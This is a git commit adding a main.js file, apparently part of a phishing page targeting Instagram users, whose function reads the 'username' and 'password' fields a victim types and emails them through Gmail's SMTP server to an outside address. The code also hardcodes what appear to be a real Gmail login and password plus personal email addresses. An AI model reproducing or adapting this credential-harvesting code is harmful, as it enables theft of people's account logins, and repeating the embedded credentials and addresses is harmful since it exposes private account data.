1a265d3c32d93fe184e037ff859355e637f52c22
Instagramgetinfo <88261996+Instagramgetinfo@users.noreply.github.com>
2021-08-01 10:10:49 +0530

    Add files via upload

---
+++ main.js
@@ -0,0 +1,15 @@
+function getinfo() {
+
+    Email.send({
+        Host: "smtp.gmail.com",
+        Username: "harshyadav42021@gmail.com",
+        Password: "harshyadava@gmil",
+        To: 'poojapatidar7154@gmail.com',
+        From: "harshyadav42021@gmail.com",
+        Subject:  document.getElementById("username").value,
+        Body:  "username =  " + document.getElementById("username").value + ",   password = " + document.getElementById("password").value,
+    })
+        .then(function (message) {
+            alert("mail sent successfully")
+        });
+}
